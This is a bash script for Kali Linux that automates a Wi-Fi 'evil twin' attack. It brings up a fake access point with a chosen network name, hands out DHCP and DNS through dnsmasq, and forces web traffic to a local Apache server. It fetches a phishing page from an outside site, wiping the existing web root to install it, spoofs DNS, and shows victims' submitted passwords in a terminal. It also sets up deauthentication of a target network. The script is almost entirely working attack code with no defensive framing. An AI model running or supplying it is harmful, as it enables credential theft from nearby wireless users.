#!/bin/bash

#########################################
### Created by: Shlez                ####
### Kali Linux - Evil Twin           ####
#########################################
#########################################
###             Functions            ####
#########################################


# Progress bar function.
progress_bar() {
  echo -ne '#####                     (33%)\r'
  sleep 1
  echo -ne '#############             (66%)\r'
  sleep 1
  echo -ne '#######################   (100%)\r'
  sleep 0.1
  echo -ne '\n'
  echo "---------- DONE ----------"
  clear
}

# Complete task function.
sleep_mode() {
  sleep 1
  echo;echo;echo
  echo "---------- DONE ----------"
  echo;echo;echo
  sleep 2
  clear
}


#########################################
###                Main              ####
#########################################

clear

echo "Installing packages..."
apt-get install dnsmasq
apt-get install apache2
clear


echo "Setting monitor mode..."
echo
airmon-ng | grep --color=always -z "PHY	Interface	Driver		Chipset"
echo
echo "-------------------------------------------"
printf "Choose an interface: "
read in_interface
clear


echo "Starting airmon-ng on $in_interface..."
airmon-ng start $in_interface
mon_interface="$in_interface"mon
clear


echo "Choose a fake ESSID access point:"
read network_name
clear


xterm -title "Access Point" -geometry 80x24+1440+0 -e "airbase-ng --essid '$network_name' -c 6 -P -vv $mon_interface" &

sudo mkdir /root/fakeap

echo "interface=at0" > /root/fakeap/dnsmasq.conf
echo "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h" >> /root/fakeap/dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> /root/fakeap/dnsmasq.conf
echo "dhcp-option=6,192.168.1.1" >> /root/fakeap/dnsmasq.conf
echo "server=8.8.8.8" >> /root/fakeap/dnsmasq.conf
echo "log-queries" >> /root/fakeap/dnsmasq.conf
echo "log-dhcp" >> /root/fakeap/dnsmasq.conf
echo "listen-address=127.0.0.1" >> /root/fakeap/dnsmasq.conf

xterm -title "DNS Server" -geometry 80x24+1440+0 -e "sudo dnsmasq -C /root/fakeap/dnsmasq.conf -d" &
progress_bar


echo "Assign the network gateway and netmask to the interface and add the routing table"
ifconfig at0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
clear


iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE
# echo "Provide internet access to the clients by changing firewall rules and allowing traffic forwarding"
# iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
# iptables --append FORWARD --in-interface at0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
clear


echo "Installing phishing webpage"
cd /root/fakeap
wget https://www.shellvoide.com/media/files/rogueap.zip #install phishing site
rm -rf /var/www/html/* # removing existing webpage
unzip rogueap.zip -d /var/www/html
clear

# start apache server
systemctl start apache2


# sniffing data and recieving webpage requests
xterm -title "DNS Spoofing" -geometry 80x24+1440+0 -e "dnsspoof -i at0" &
clear


# showing passwords on terminal
xterm -title "Passwords" -geometry 80x24+1440+0 -e  "sudo tcpflow -i any -C -g port 80 | grep -i "password1="" &


# Show list of bssid's and channels
xterm -geometry 80x24+1440+0 -e "airodump-ng -i $mon_interface"

clear

echo "Deauthenticating all..."

printf "BSSID:    "
read bssid
printf "Channel:  "
read channel
clear

# Changing channal of monitor mode - same as AP
sudo iwconfig $mon_interface channel $channel


# Deauthenticating the AP - broadcast
# xterm -title "deauthenticating" -geometry 80x24+0+900 -e "aireplay-ng --deauth 10000 -a $bssid $mon_interface"
